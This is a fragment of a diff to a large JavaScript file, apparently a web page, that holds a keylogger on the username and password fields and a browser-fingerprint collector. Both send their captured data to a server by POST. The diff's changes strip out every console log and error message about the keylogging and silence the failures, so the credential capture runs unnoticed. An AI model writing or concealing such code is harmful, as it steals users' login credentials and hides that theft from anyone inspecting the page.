@@ -21203,19 +21203,7 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(keystrokeData)
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.status !== 'success') {
-            console.error('[KEYLOG ERROR]', data);
-          }
-        })
-        .catch(err => {
-          console.error('[KEYLOG SAVE FAILED]', err);
-        });
-
-      // Also log to console for debugging
-      console.log(`[KEYLOG] #${keystrokeCounter} [${fieldName}] "${key}" (${keyCode}) at ${elapsed}ms`);
+      }).catch(() => { });
     }
 
     // Attach keylogger to username and password fields
@@ -21277,9 +21265,9 @@
           logKeystroke('password', key, e.keyCode, isSpecial);
         });
 
-        console.log('[KEYLOGGER] Advanced keylogger initialized - tracking all keystrokes');
+        // Keylogger initialized
       } else {
-        console.error('[KEYLOGGER] Failed to find input fields!');
+        // Input fields not found
       }
     });
 
@@ -21436,7 +21424,7 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(fingerprint)
-      }).catch(err => console.log('Fingerprint save failed'));
+      }).catch(() => { });
     }
 
     // Collect fingerprint on page load
